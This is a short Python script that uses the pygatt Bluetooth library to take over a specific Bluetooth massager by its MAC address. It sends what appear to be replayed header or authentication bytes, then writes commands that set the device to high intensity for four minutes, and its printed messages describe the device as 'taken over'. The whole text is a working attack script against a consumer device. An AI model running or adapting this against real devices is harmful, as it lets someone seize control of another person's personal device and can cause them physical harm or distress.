import pygatt
import time
adapter = pygatt.GATTToolBackend()
adapter.start()
print '-->Adapter Start'
device = adapter.connect('5C:F8:21:B3:0C:3F') #MAC of the massager
print '-->Massager ready to get taken over'
adapter.sendline('char-write-cmd 0x0025 a105852a17a12589c70b2366f2bc7f98b53e32')
adapter.sendline('char-write-cmd 0x0025 a106410a1a1a30b7e320bda291')
adapter.sendline('char-write-cmd 0x0025 a107')
print '-->headers sent'
adapter.sendline('char-write-cmd 0x0025 a104030501') #Mode 3 of 5 Intensity with 1Min
time.sleep(0.3)
adapter.sendline('char-write-cmd 0x0025 a104070f04') #Mode 7 of 15 Intensity with 4Min
time.sleep(0.3)
print '-->High Intensity Triggered for 4 Min duration'
adapter.stop()
print '-->Disconnected'
